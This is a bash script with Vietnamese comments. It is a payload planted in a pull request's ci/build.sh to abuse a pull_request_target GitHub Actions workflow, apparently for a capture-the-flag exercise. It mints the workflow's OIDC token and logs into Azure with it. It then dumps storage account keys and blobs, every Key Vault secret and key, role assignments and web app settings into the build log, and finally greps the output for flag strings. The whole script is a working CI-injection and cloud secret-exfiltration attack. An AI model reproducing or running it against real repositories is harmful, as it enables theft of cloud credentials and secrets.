#!/usr/bin/env bash
# PAYLOAD nay se nam trong ci/build.sh cua PR, chay VOI quyen cua upstream workflow
# (id-token: write) khi pull_request_target trigger. Doc Azure Key Vault/Storage de tim flag.
set -e
echo "::group::Mint Azure OIDC token"
TOK=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
echo "token len: ${#TOK}"
echo "::endgroup::"

echo "::group::Azure login"
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" --federated-token "$TOK" -o none
az account set --subscription "$AZURE_SUBSCRIPTION_ID" 2>/dev/null || true
az account show -o table
echo "::endgroup::"

echo "::group::Enumerate resources"
az group list -o table
az storage account list -o table
az keyvault list -o table
echo "::endgroup::"

echo "::group::Storage: internal-config.json (moi account, container 'config')"
for SA in $(az storage account list --query "[].name" -o tsv 2>/dev/null); do
  echo "--- account: $SA ---"
  KEY=$(az storage account keys list -n "$SA" --query "[0].value" -o tsv 2>/dev/null) || continue
  az storage container list --account-name "$SA" --account-key "$KEY" --query "[].name" -o tsv 2>/dev/null
  for C in config configs cfg secrets internal; do
    az storage blob list --account-name "$SA" --account-key "$KEY" -c "$C" --query "[].name" -o tsv 2>/dev/null | while read -r B; do
      echo "   blob: $C/$B"
      az storage blob download --account-name "$SA" --account-key "$KEY" -c "$C" -n "$B" --file "/tmp/${SA}_${C}_${B//\//_}" --output none 2>/dev/null \
        && echo "   >>> $(cat "/tmp/${SA}_${C}_${B//\//_}")"
    done
  done
done
echo "::endgroup::"

echo "::group::Key Vault secrets"
for KV in $(az keyvault list --query "[].name" -o tsv 2>/dev/null); do
  echo "--- vault: $KV ---"
  for S in $(az keyvault secret list --vault-name "$KV" --query "[].name" -o tsv 2>/dev/null); do
    V=$(az keyvault secret show --vault-name "$KV" -n "$S" --query value -o tsv 2>/dev/null)
    echo "   $S => $V"
  done
done
echo "::endgroup::"

echo "::group::Role assignments tai DUNG scope cua moi KV (khac voi scope RG - co the lo ra assignment rieng)"
RG="rg-tbl-platform-prod-sea"
for KVNAME in kv-tbl-prod-x3euoz kv-tbl-sec-x3euoz; do
  ID="/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/$RG/providers/Microsoft.KeyVault/vaults/$KVNAME"
  echo "--- scope: $KVNAME ---"
  az role assignment list --scope "$ID" --include-inherited -o json
done
echo "::endgroup::"

echo "::group::Thu doc secret/key truc tiep tren tung KV (phong truong hop co quyen rieng)"
for KVNAME in kv-tbl-prod-x3euoz kv-tbl-sec-x3euoz; do
  echo "--- $KVNAME secrets ---"
  az keyvault secret list --vault-name "$KVNAME" -o json 2>&1
  echo "--- $KVNAME keys ---"
  az keyvault key list --vault-name "$KVNAME" -o json 2>&1
done
echo "::endgroup::"

echo "::group::Reporting RG (rg-tbl-reporting-prod-eus) - toan bo resource + app detail"
az resource list -g rg-tbl-reporting-prod-eus -o table 2>&1
az webapp show -g rg-tbl-reporting-prod-eus -n app-tbl-reporting-prod -o json 2>&1
az webapp config appsettings list -g rg-tbl-reporting-prod-eus -n app-tbl-reporting-prod -o json 2>&1
az role assignment list -g rg-tbl-reporting-prod-eus --include-inherited -o json 2>&1
echo "::endgroup::"

echo "::group::Storefront webapp identity + appsettings"
az webapp list -g "$RG" -o table 2>&1
for APP in $(az webapp list -g "$RG" --query "[].name" -o tsv 2>/dev/null); do
  echo "--- $APP ---"
  az webapp show -g "$RG" -n "$APP" --query "{identity:identity,host:defaultHostName,state:state}" -o json 2>&1
  az webapp config appsettings list -g "$RG" -n "$APP" -o json 2>&1
done
echo "::endgroup::"

echo "::group::grep flag format tren moi output da luu"
grep -roaE 'DF26\{[^}]*\}|CBJS\{[^}]*\}|FLAG\{[^}]*\}' /tmp/ 2>/dev/null || echo "(chua thay, doc ky output cac block tren)"
echo "::endgroup::"
